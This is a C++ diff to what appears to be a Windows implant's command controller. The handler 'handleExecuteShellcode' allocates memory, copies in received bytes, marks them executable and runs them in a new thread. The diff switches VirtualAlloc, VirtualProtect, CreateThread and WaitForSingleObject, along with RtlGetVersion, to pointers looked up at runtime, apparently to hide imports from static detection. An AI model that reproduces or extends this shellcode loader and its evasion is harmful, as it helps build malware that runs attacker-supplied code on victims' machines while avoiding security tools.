@@ -16,6 +16,15 @@ Controller::Controller(
 {
 }
 
+Controller::Controller(
+    MessageHandler* messageHandler, 
+    ApiManager* apiManager)
+    :
+    messageHandler_(messageHandler),
+    apiManager_(apiManager)
+{
+}
+
 void Controller::handleDefault(const InternalMessage& msg)
 {
 	std::cout << "Controller::handleDefault()" << std::endl;
@@ -74,8 +83,14 @@ void Controller::handleExecuteCommand(const InternalMessage& msg)
 void Controller::handleExecuteShellcode(const InternalMessage& msg)
 {
 	std::cout << "Controller::handleExecuteShellcode()" << std::endl;
+    
+    typedef LPVOID(WINAPI* FuncVirtualAlloc)
+    (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)apiManager_->fProcedures_["VirtualAlloc"];
 
-	LPVOID shellMem = VirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	//LPVOID shellMem = VirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	LPVOID shellMem = pVirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!shellMem) // TODO: checking if it is NULL would be more correct?
 	{
 		std::cout << "VirtualAlloc failed" << std::endl;
@@ -90,10 +105,15 @@ void Controller::handleExecuteShellcode(const InternalMessage& msg)
 		((char*)shellMem)[i] = msg.data_[i];
 	}
 
+    typedef BOOL(WINAPI* FuncVirtualProtect)
+    (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)apiManager_->fProcedures_["VirtualProtect"];
+
 	// EXECUTE_READ.
 	DWORD old_prot; // TODO: change to PDWORD lpflOldProtect?
 	// NOTE: virtualProtect is also being called somewhere in the windows api
-	if (VirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
+	if (pVirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
+	//if (VirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
 	{
 		std::cout << "VirtualProtect failed" << std::endl;
 		// Fail silently if we cannot make the memory executable.
@@ -102,9 +122,20 @@ void Controller::handleExecuteShellcode(const InternalMessage& msg)
 
 	// DEBUG_PRINT("6 - Memory allocated and copied");
 
+    typedef HANDLE(WINAPI* FuncCreateThread)
+	(LPSECURITY_ATTRIBUTES lpThreadAttributes, 
+     SIZE_T dwStackSize,
+     LPTHREAD_START_ROUTINE lpStartAddress, 
+     LPVOID lpParameter, 
+     DWORD dwCreationFlags, 
+     LPDWORD lpThreadId);
+
+    FuncCreateThread pCreateThread = (FuncCreateThread)apiManager_->fProcedures_["CreateThread"];
+
 	// 4.
 	//HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
-	HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
+	HANDLE thread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
+	//HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
 	if (!thread)
 	{
 		std::cout << "CreateThread failed" << std::endl;
@@ -112,8 +143,16 @@ void Controller::handleExecuteShellcode(const InternalMessage& msg)
         return;
 	}
 
+    typedef DWORD(WINAPI* FuncWaitForSingleObject)
+	(HANDLE hHandle, DWORD dwMilliseconds);
+
+    FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)apiManager_->fProcedures_["WaitForSingleObject"];
+
 	// DEBUG_PRINT("7 - Thread created, waiting..."); 
-	WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
+	pWaitForSingleObject(thread, INFINITE); // Wait for thread to complete
+	//WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
+
+    // TODO: virtual free?
 
 }
 
@@ -135,10 +174,13 @@ void Controller::handleSystemInfo(const InternalMessage& msg)
     //}
     ///
     typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
-    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
+    //HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
+    HMODULE hMod = apiManager_->hModules_[L"ntdll.dll"];
     if (hMod)
     {
-        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
+        // TODO: use apiManager for this
+        //RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
+        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)apiManager_->fProcedures_["RtlGetVersion"];
         if (fxPtr != nullptr)
         {
             RTL_OSVERSIONINFOW rovi = { 0 };
